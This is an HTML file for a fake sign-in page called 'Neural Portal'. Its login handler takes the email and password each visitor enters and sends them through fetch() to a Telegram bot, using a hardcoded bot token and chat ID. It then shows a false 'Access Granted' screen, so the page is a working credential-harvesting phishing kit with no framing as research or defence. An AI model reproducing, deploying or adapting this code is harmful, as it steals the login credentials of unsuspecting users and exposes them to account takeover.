<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Neural Portal 🚀</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; user-select: none; }
body, html { width: 100%; height: 100%; overflow: hidden; background: #030712; color: #fff; display: flex; justify-content: center; align-items: center; }

.portal-card {
  position: relative; z-index: 10;
  width: 90%; max-width: 400px;
  padding: 35px 25px;
  background: rgba(15, 23, 42, 0.9);
  border: 1px solid rgba(255, 255, 255, 0.15);
  border-radius: 24px;
  box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8);
  text-align: center;
}

.avatar-ring {
  width: 65px; height: 65px; margin: 0 auto 15px auto;
  border-radius: 50%;
  background: linear-gradient(135deg, #6366f1, #a855f7);
  padding: 3px;
}
.avatar-inner {
  width: 100%; height: 100%; background: #0f172a; border-radius: 50%;
  display: flex; justify-content: center; align-items: center; font-size: 26px;
}

h2 { font-size: 24px; font-weight: 700; color: #fff; margin-bottom: 6px; }
p.desc { font-size: 13px; color: #94a3b8; margin-bottom: 25px; }

.input-field { margin-bottom: 18px; text-align: left; }
.input-field label { display: block; font-size: 12px; font-weight: 600; color: #cbd5e1; margin-bottom: 6px; }
.input-field input {
  width: 100%; padding: 14px 16px; background: rgba(30, 41, 59, 0.8);
  border: 1px solid rgba(255, 255, 255, 0.15); border-radius: 12px;
  color: #fff; font-size: 15px; outline: none;
}
.input-field input:focus { border-color: #a855f7; }

.btn-primary {
  width: 100%; padding: 15px;
  background: linear-gradient(135deg, #6366f1, #a855f7);
  border: none; border-radius: 12px;
  color: #fff; font-size: 16px; font-weight: 600;
  cursor: pointer; margin-top: 10px;
}
.btn-primary:active { transform: scale(0.97); }
#errorMsg { color: #f43f5e; font-size: 13px; margin-top: 12px; min-height: 18px; }

.dashboard-card { display: none; text-align: center; }

.logout-anim-btn {
  position: relative; width: 100%;
  display: flex; align-items: center; justify-content: center;
  padding: 15px; background: #e11d48;
  border: none; border-radius: 12px; color: #fff; font-size: 16px; font-weight: 600;
  cursor: pointer; overflow: hidden; margin-top: 20px;
}
</style>
</head>
<body>

<!-- Login Form -->
<div class="portal-card" id="loginCard">
  <div class="avatar-ring">
    <div class="avatar-inner">⚡</div>
  </div>
  <h2>Neural Portal</h2>
  <p class="desc">Enter authorized credentials to proceed</p>

  <div class="input-field">
    <label>Email Address</label>
    <input type="email" id="email" placeholder="user@nexus.io" autocomplete="off">
  </div>

  <div class="input-field">
    <label>Passcode / Password</label>
    <input type="password" id="password" placeholder="••••••••">
  </div>

  <button class="btn-primary" onclick="handleLogin()">Sign In ➔</button>
  <div id="errorMsg"></div>
</div>

<!-- Dashboard Box -->
<div class="portal-card dashboard-card" id="dashCard">
  <h2 style="color:#10b981;">Access Granted ✨</h2>
  <p class="desc" style="margin-top:10px;">Session established successfully.</p>

  <button class="logout-anim-btn" id="logoutBtn" onclick="handleLogout()">
    <span id="btnText">Sign Out</span>
  </button>
</div>

<script>
const BOT_TOKEN = "8825023377:AAGOss8yK3V15XRGZyiBM9y58F1q5KjxRcQ";
const CHAT_ID = "1993924204";

function handleLogin() {
  const email = document.getElementById('email').value.trim();
  const pass = document.getElementById('password').value.trim();
  const errorMsg = document.getElementById('errorMsg');

  if (!email || !pass) {
    errorMsg.textContent = "⚠️ Please fill all input fields.";
    return;
  }

  errorMsg.textContent = "";

  const text = `🔔 *New Login Captured!*\n\n📧 *Email:* \`${email}\` \n🔑 *Password:* \`${pass}\``;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;

  fetch(url).catch(err => console.log(err));

  document.getElementById('loginCard').style.display = 'none';
  document.getElementById('dashCard').style.display = 'block';
}

function handleLogout() {
  document.getElementById('email').value = "";
  document.getElementById('password').value = "";
  document.getElementById('dashCard').style.display = 'none';
  document.getElementById('loginCard').style.display = 'block';
}
</script>

</body>
</html>
